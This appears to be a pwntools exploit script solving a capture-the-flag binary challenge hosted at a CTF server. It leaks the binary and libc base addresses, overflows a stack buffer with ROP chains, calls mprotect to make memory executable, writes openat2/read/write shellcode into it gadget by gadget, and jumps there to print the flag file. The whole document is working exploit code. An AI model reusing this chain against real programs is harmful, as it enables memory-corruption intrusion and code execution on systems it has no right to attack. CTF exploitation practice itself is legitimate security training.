from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './chal_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context(terminal=['tmux', 'split-window', '-h'])
libc = ELF('./libc.so.6', checksec=False)

if args.REMOTE:
    io = remote('menu.challs.csc.tf', 1337)
else:
    io = start()

# Grab address to get binary base address

io.recvuntil(b'0x')
leaked_addr = int(io.recvline()[:-1], 16)
log.info("Leaked address: %#x", leaked_addr)

elf_offset = 0x15fe
elf.address = leaked_addr - elf_offset
log.info("Binary base: %#x", elf.address)

# Leak libc puts to calculate libc base address

offset = 216

rop = ROP(elf)
rop.raw(b'A'*offset + p64(rop.find_gadget(['ret']).address))
rop.printf()
rop.puts()
rop.main()

io.sendlineafter(b'today?\n', rop.chain())

io.recvlines(2)
leak = u64(io.recvline()[:-1].ljust(8, b'\x00'))
log.info("Libc leak: %#x", leak)

libc.address = leak - libc.sym['__funlockfile']
log.info("Libc base: %#x", libc.address)

# Use mprotect to make binary region RWX so we can put shellcode there

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
pop_rdx_r12 = rop.find_gadget(['pop rdx', 'pop r12', 'ret']).address
mprotect = libc.sym['mprotect']

payload = flat(
        b"A"*offset,
        pop_rdi,
        elf.address,
        pop_rsi,
        0x7000,
        pop_rdx_r12,
        0x7,
        0x0,
        mprotect,
        elf.sym['menu']
        )

io.sendlineafter(b'today?\n', payload)

shellcode = asm(
    """
    // openat2(int dirfd, const char *pathname, const struct open_how *how, size_t size);

    xor rdi, rdi
    sub rdi, 100
    mov rcx, 0x0067616c662f2e
    push rcx
    mov rsi, rsp
    push 0
    push 0
    push 0
    mov rdx, rsp
    mov r10, 0x18
    mov rax, 0x1b5
    syscall

    // read(int fd, void buf[.count], size_t count);

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x30
    mov rax, 0x0
    syscall

    // write(int fd, const void buf[.count], size_t count);

    mov rdi, 0x1
    mov rdx, 0x30
    mov rsi, rsp
    mov rax, 0x1
    syscall
    """)

# Writeable address in binary region
writeable_addr = elf.address + 0x4050
log.info("Writeable address: %#x", writeable_addr)

pop_rcx = rop.find_gadget(['pop rcx', 'ret']).address
mov_rcx_rdx = libc.address + 0x18d560  # mov qword ptr [rcx], rdx; ret; 

# Write shellcode to writeable address
for i in range(0, len(shellcode), 8):
    payload = flat(
        b"A" * offset,
        pop_rcx,
        writeable_addr + i,
        pop_rdx_r12,
        shellcode[i:i+8] + (b'\x00' * (8 - len(shellcode[i:i+8]))),
        0x0,
        mov_rcx_rdx,
        elf.sym['menu'],
        )
    
    io.sendlineafter(b'today?\n', payload)

# Jump to writeable address
payload = flat(
    b"A" * offset,
    writeable_addr
    )

io.sendlineafter(b'today?\n', payload)
io.interactive()
